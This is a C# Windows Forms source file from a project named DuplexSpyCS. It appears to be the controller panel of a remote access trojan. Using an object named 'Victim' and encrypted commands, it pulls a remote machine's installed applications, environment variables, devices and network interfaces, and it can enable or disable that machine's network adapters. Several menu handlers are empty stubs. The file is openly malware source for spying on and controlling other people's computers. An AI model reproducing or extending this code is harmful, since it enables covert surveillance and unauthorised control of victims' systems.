using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace DuplexSpyCS
{
    public partial class frmSystem : Form
    {
        public Victim v;
        private struct DeviceInfo
        {
            public string Name;
            public string Status;
            public string Manufacturor;
            public string DeviceID;
            public string PNP_Class;
        }
        private Dictionary<string, DeviceInfo> dic_Devices = new Dictionary<string, DeviceInfo>();
        private ImageList il_devices = new ImageList();

        public frmSystem()
        {
            InitializeComponent();
        }

        //APPLICATION
        void init_App()
        {
            //LISTVIEW
            string[] cols =
            {
                "DisplayName",
                "Publisher",
                "DisplayVersion",
                "InstallDate",
                "InstallSource",
            };
            listView1.Columns.AddRange(cols.Select(x => new ColumnHeader() { Text = x, Width = 200 }).ToArray());

            listView1.View = View.Details;
            listView1.FullRowSelect = true;

            v.encSend(2, 0, "system|app|init");
        }
        public void App_ShowApps(List<string[]> apps)
        {
            foreach (string[] app in apps)
            {
                ListViewItem item = new ListViewItem(app[0]);
                item.SubItems.AddRange(app.Where(x => x != app[0]).Select(x => new ListViewItem.ListViewSubItem() { Text = x }).ToArray());
                Invoke(new Action(() => listView1.Items.Add(item)));
            }

            Invoke(new Action(() => toolStripStatusLabel1.Text = $"Application[{listView1.Items.Count}]"));
        }

        //ENVIRONMENT VARIABLE
        void init_EV()
        {
            string[] cols =
            {
                "Key",
                "Value",
            };
            listView3.Columns.AddRange(cols.Select(x => new ColumnHeader() { Text = x, Width = 200 }).ToArray());

            listView3.View = View.Details;
            listView3.FullRowSelect = true;

            v.encSend(2, 0, "system|ev|init");
        }
        public void EV_ShowEVs(List<string[]> evs)
        {
            foreach (string[] ev in evs)
            {
                ListViewItem item = new ListViewItem(ev[0]);
                item.SubItems.AddRange(ev.Where(x => x != ev[0] && !C1.IsGuid(x)).Select(x => new ListViewItem.ListViewSubItem() { Text = x }).ToArray());
                Invoke(new Action(() => listView3.Items.Add(item)));
            }
        }

        //DEVICES
        void init_Device()
        {
            v.encSend(2, 0, "system|device|init");
        }
        public void Device_ShowDevices(List<string[]> devices)
        {
            TreeNode FindNode(string text)
            {
                TreeNode node = null;
                Invoke(new Action(() =>
                {
                    foreach (TreeNode tmp in treeView1.Nodes)
                    {
                        if (tmp.Text == text)
                        {
                            node = tmp;
                            break;
                        }
                    }
                }));

                return node;
            }

            foreach (string[] device in devices)
            {
                string name = device[0];
                if (name == "X")
                    continue;

                string status = device[1];
                string manu = device[2];
                string id = device[3];
                string pnp_class = device[4];
                string class_guid = device[5];

                dic_Devices.Add(id, new DeviceInfo()
                {
                    Name = name,
                    Status = status,
                    Manufacturor = manu,
                    DeviceID = id,
                    PNP_Class = pnp_class
                });

                Invoke(new Action(() =>
                {
                    TreeNode nClass = FindNode(pnp_class);
                    if (nClass == null)
                    {
                        nClass = new TreeNode(pnp_class);
                        Icon icon = DeviceIconExtract.GetDeviceClassIcon(class_guid);
                        if (icon != null)
                            il_devices.Images.Add(pnp_class, icon);
                        nClass.ImageKey = pnp_class;
                        treeView1.Nodes.Add(nClass);
                    }
                    nClass.Nodes.Add(new TreeNode(name) { ImageKey = nClass.ImageKey });
                }));
            }
        }
        private void Device_ReqDetail()
        {
            v.encSend(2, 0, "system|device|detail");
        }
        public void Device_ShowDetail()
        {

        }
        private void Device_SendEnable(bool enable)
        {
            v.encSend(2, 0, "system|device|" + (enable ? "e" : "d"));
        }
        private void Device_Refresh()
        {

        }

        //NETWORK INTERFACE
        void init_if()
        {
            //LISTVIEW
            string[] cols =
            {
                "Name",
                "Description",
                "Type",
                "Status",
                "MAC Address",
            };
            listView2.Columns.AddRange(cols.Select(x => new ColumnHeader() { Text = x, Width = 200 }).ToArray());

            listView2.View = View.Details;
            listView2.FullRowSelect = true;

            v.encSend(2, 0, "system|if|init");
        }
        public void If_ShowInterface(List<string[]> interfaces)
        {
            foreach (string[] i in interfaces)
            {
                ListViewItem item = new ListViewItem(i[0]);
                item.SubItems.AddRange(i.Where(x => x != i[0]).Select(x => new ListViewItem.ListViewSubItem() { Text = x }).ToArray());
                Invoke(new Action(() => listView2.Items.Add(item)));
            }
        }
        private void If_ReqDetail(bool enable)
        {
            foreach (ListViewItem item in listView2.SelectedItems)
                v.encSend(2, 0, $"system|if|enable|{Crypto.b64E2Str(item.Text)}|" + (enable ? "1" : "0"));
        }

        void setup()
        {
            treeView1.ImageList = il_devices;

            init_App();
            init_if();
            init_EV();
            init_Device();
        }

        private void frmSystem_Load(object sender, EventArgs e)
        {
            setup();
        }

        private void treeView1_AfterSelect(object sender, TreeViewEventArgs e)
        {

        }

        private void treeView1_BeforeSelect(object sender, TreeViewCancelEventArgs e)
        {

        }

        //DEVICE - DETAIL
        private void toolStripMenuItem2_Click(object sender, EventArgs e)
        {

        }
        //DEVICE - ENABLE
        private void toolStripMenuItem3_Click(object sender, EventArgs e)
        {

        }
        //DEVICE - DISABLE
        private void toolStripMenuItem4_Click(object sender, EventArgs e)
        {

        }

        //INTERFACE - ENABLE
        private void toolStripMenuItem6_Click(object sender, EventArgs e)
        {
            If_ReqDetail(true);
        }
        //INTERFACE - DISABLE
        private void toolStripMenuItem7_Click(object sender, EventArgs e)
        {
            If_ReqDetail(false);
        }
    }
}
